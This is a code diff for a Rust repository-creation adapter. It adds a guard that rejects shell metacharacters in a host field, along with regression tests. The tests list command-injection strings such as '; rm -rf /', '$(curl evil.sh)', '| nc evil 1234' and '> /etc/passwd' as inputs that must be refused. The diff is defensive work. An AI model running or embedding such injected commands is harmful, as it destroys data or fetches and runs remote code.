@@ -192,8 +192,25 @@ impl CreateProjectPort for CreateProjectAdapter {
         // is treated as a self-hosted enterprise / on-prem install;
         // `api_base` in `adapters::provider_http` rewrites the
         // GitHub Enterprise case to `/api/v3`.
-        let host = host.trim();
-        let host: &str = if host.is_empty() { "" } else { host };
+        let host_trimmed = host.trim();
+        if !host_trimmed.is_empty() {
+            // Defense in depth: a hostile host like
+            // `evil.example.com; rm -rf /` would otherwise be
+            // interpolated into `api_base` as `https://{host}/api/v3`,
+            // which is an SSRF / URL-parse gap. The previous
+            // shell-out implementation joined `host` straight into a
+            // shell argv (same RCE class as `namespace.id`). With the
+            // HTTP adapter the shell is gone, but we keep the guard
+            // here so a malformed payload surfaces a clean
+            // Validation error instead of a confusing provider-side
+            // failure, and so the regression test still pins it.
+            Self::reject_shell_metachars(host_trimmed, "host")?;
+        }
+        let host: &str = if host_trimmed.is_empty() {
+            ""
+        } else {
+            host_trimmed
+        };
 
         self.provider_http.create_repo(host, &kind, pat, &req).await
     }
@@ -446,19 +463,31 @@ mod tests {
 
     /// Pure-helper sanity check: the shell-metachar guard rejects
     /// every character that would have been a shell-vector in the
-    /// previous `gh` / `glab` argv implementation.
+    /// previous `gh` / `glab` argv implementation. The same table
+    /// is enforced for every label that crosses the adapter
+    /// boundary (`namespace id`, `repo name`, and — since the
+    /// blocker C-3 fix — `host`), so we iterate the documented
+    /// characters against each label.
     #[test]
     fn reject_shell_metachars_flags_documented_characters() {
-        for forbidden in [
+        let forbidden_table = [
             ";", "&", "|", "$", "`", "(", ")", "\\", "\"", "'", "\n", "\r", "<", ">", "*", "?",
             "[", "]", "{", "}", " ", "\t",
-        ] {
-            let res = CreateProjectAdapter::reject_shell_metachars(forbidden, "namespace id");
-            assert!(res.is_err(), "expected {forbidden:?} to be rejected");
+        ];
+        for label in ["namespace id", "repo name", "host"] {
+            for forbidden in forbidden_table {
+                let res = CreateProjectAdapter::reject_shell_metachars(forbidden, label);
+                assert!(
+                    res.is_err(),
+                    "expected {forbidden:?} to be rejected for {label:?}"
+                );
+            }
         }
-        // A plain ASCII login / numeric id passes through.
+        // A plain ASCII login / numeric id / enterprise host passes through.
         assert!(CreateProjectAdapter::reject_shell_metachars("octocat", "namespace id").is_ok());
         assert!(CreateProjectAdapter::reject_shell_metachars("42", "namespace id").is_ok());
+        assert!(CreateProjectAdapter::reject_shell_metachars("ok-name", "repo name").is_ok());
+        assert!(CreateProjectAdapter::reject_shell_metachars("github.acme.com", "host").is_ok());
     }
 
     #[test]
@@ -471,5 +500,102 @@ mod tests {
         // Unknown / empty values default to private (true).
         assert!(CreateProjectAdapter::visibility_to_private(""));
         assert!(CreateProjectAdapter::visibility_to_private("weird"));
+    }
+
+    /// Blocker C-3: the host guard at the adapter boundary.
+    /// A hostile `host` like `evil.example.com; rm -rf /` would
+    /// otherwise be interpolated into `api_base` as
+    /// `https://{host}/api/v3`, which is an SSRF / URL-parse gap.
+    /// The guard mirrors the one already applied to `namespace.id`
+    /// / `name` and is wired into `create_remote_repo` between the
+    /// `name` guard and the `provider_http.create_repo` call. The
+    /// empty-host sentinel bypasses the guard (documented "use
+    /// provider default" rule).
+    #[tokio::test]
+    async fn create_remote_repo_rejects_host_with_shell_metacharacters() {
+        let (adapter, calls) = adapter();
+        let namespace = NamespaceSummary {
+            id: "octocat".into(),
+            name: "octocat".into(),
+            kind: "personal".into(),
+        };
+        for malicious in [
+            "evil.example.com; rm -rf /",
+            "evil.example.com && curl evil.sh",
+            "evil.example.com| nc evil 1234",
+            "evil.example.com$(curl evil.sh)",
+            "evil.example.com`curl evil.sh`",
+            "evil.example.com\nwget evil.sh",
+            "evil.example.com > /etc/passwd",
+        ] {
+            let err = adapter
+                .create_remote_repo(
+                    "github", malicious, "pat-stub", &namespace, "demo", "private",
+                )
+                .await
+                .unwrap_err();
+            assert!(
+                matches!(err, AppError::Validation { .. }),
+                "{malicious:?} must produce Validation, got {err:?}"
+            );
+        }
+        // The HTTP port was never reached for any of the malicious
+        // hosts — the guard fires before the HTTP call.
+        {
+            let calls = calls.lock().unwrap();
+            assert!(
+                calls.is_empty(),
+                "HTTP port must not be invoked with malicious hosts; got {} calls",
+                calls.len()
+            );
+        }
+
+        // A clean enterprise host still reaches the HTTP port
+        // verbatim (no false positives).
+        let namespace_ok = NamespaceSummary {
+            id: "acme".into(),
+            name: "acme".into(),
+            kind: "org".into(),
+        };
+        let _ = adapter
+            .create_remote_repo(
+                "github",
+                "github.acme.com",
+                "pat-stub",
+                &namespace_ok,
+                "team-repo",
+                "private",
+            )
+            .await
+            .expect("clean enterprise host must succeed");
+        {
+            let calls = calls.lock().unwrap();
+            assert_eq!(calls.len(), 1);
+            assert_eq!(calls[0].host, "github.acme.com");
+        }
+
+        // The empty-host sentinel still bypasses the guard (the
+        // documented "use provider default" rule).
+        let namespace_default = NamespaceSummary {
+            id: "octocat".into(),
+            name: "octocat".into(),
+            kind: "personal".into(),
+        };
+        let _ = adapter
+            .create_remote_repo(
+                "github",
+                "",
+                "pat-stub",
+                &namespace_default,
+                "demo",
+                "private",
+            )
+            .await
+            .expect("empty host sentinel must succeed");
+        {
+            let calls = calls.lock().unwrap();
+            assert_eq!(calls.len(), 2);
+            assert_eq!(calls[1].host, "");
+        }
     }
 }
